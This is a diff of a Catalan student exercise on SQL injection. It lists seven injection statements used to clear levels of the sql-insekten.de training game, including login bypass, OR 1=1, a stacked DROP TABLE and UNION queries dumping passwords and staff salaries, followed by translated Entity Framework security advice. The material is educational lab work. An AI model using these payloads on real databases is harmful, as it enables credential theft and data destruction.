@@ -38,25 +38,57 @@
 
 2. **Obre el següent enllaç ([sql inseckten](https://www.sql-insekten.de/)) i realitza un mínim de 7 nivells fent servir tècniques d’injecció SQL.**   
    - **Copia cada una de les sentències SQL resultant que has realitzat a cada nivell i comenta que has aconseguit.**  
+
+      1. `SELECT username 
+      FROM users 
+      WHERE username ='jane'; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';`
+
+      2. `SELECT username 
+      FROM users 
+      WHERE username ='' ; DROP TABLE users; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';`
+
+      3. `SELECT username 
+      FROM users 
+      WHERE username ='' OR 1=1; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';`
+
+      4. `SELECT username 
+      FROM users 
+      WHERE username ='' OR 1=1 ORDER BY user_id LIMIT 1 --' AND password ='d41d8cd98f00b204e9800998ecf8427e';`
+
+      5. `SELECT product_id, brand, size, price 
+      FROM shoes 
+      WHERE brand='' UNION select username, password from users; --';`
+
+      6. `SELECT username 
+      FROM users 
+      WHERE username ='' UNION SELECT s.salary AS staff_salary FROM staff s WHERE s.firstname = 'Greta Maria' -- ' AND password ='d41d8cd98f00b204e9800998ecf8427e';`
+
+      7. `SELECT product_id, brand, size, price 
+      FROM shoes 
+      WHERE brand='' UNION SELECT name, email, salary, employed_since FROM staff --';`
+
    - **Enumera i raona diferents formes que pot evitar un atac per SQL injection en projectes fets amb Razor Pages i Entity Framework.** 
 
-   Consideraciones de seguridad a seguir segun la documentacion de EF:
-   - Use solo proveedores de orígenes de datos de confianza
-   - Cifre la conexión para proteger los datos confidenciales
-   - Proteja la cadena de conexión
-   - No exponga EntityConnection a usuarios que no sean de confianza
-   - No pase las conexiones fuera del contexto de seguridad
-   - Tenga cuenta que la información de inicio de sesión y las contraseñas pueden quedar visibles en un volcado de memoria
-   - Conceda a los usuarios únicamente los permisos necesarios en el origen de datos
-   - Ejecute las aplicaciones con los permisos mínimos
-   - No instale aplicaciones que no sean de confianza
-   - Restrinja el acceso a todos los archivos de configuración
-   - Restrinja los permisos a los archivos de asignación y de modelo
+## Consideracions de seguretat a seguir segons la documentació d'EF:
 
-   Consideraciones de seguridad para las consultas a la base de datos
-   - Impida los ataques de inyección de SQL
-   - Evite conjuntos de resultados muy grandes
-   - Evitar devolver resultados de IQueryable al exponer métodos a autores de llamadas que pueden no ser de confianza
+- Utilitzeu només proveïdors d'orígens de dades de confiança  
+- Xifreu la connexió per protegir les dades confidencials  
+- Protegiu la cadena de connexió  
+- No exposeu `EntityConnection` a usuaris que no siguin de confiança  
+- No passeu les connexions fora del context de seguretat  
+- Tingueu en compte que la informació d'inici de sessió i les contrasenyes poden quedar visibles en un bolcat de memòria  
+- Concediu als usuaris únicament els permisos necessaris a l'origen de dades  
+- Executeu les aplicacions amb els permisos mínims  
+- No instal·leu aplicacions que no siguin de confiança  
+- Restringiu l'accés a tots els fitxers de configuració  
+- Restringiu els permisos als fitxers d'assignació i de model  
+
+## Consideracions de seguretat per a les consultes a la base de dades  
+
+- Impediu els atacs d'injecció de SQL  
+- Eviteu conjunts de resultats massa grans  
+- Eviteu retornar resultats de `IQueryable` en exposar mètodes a autors de trucades que poden no ser de confiança  
+
 
 https://learn.microsoft.com/es-es/dotnet/framework/data/adonet/ef/security-considerations
 
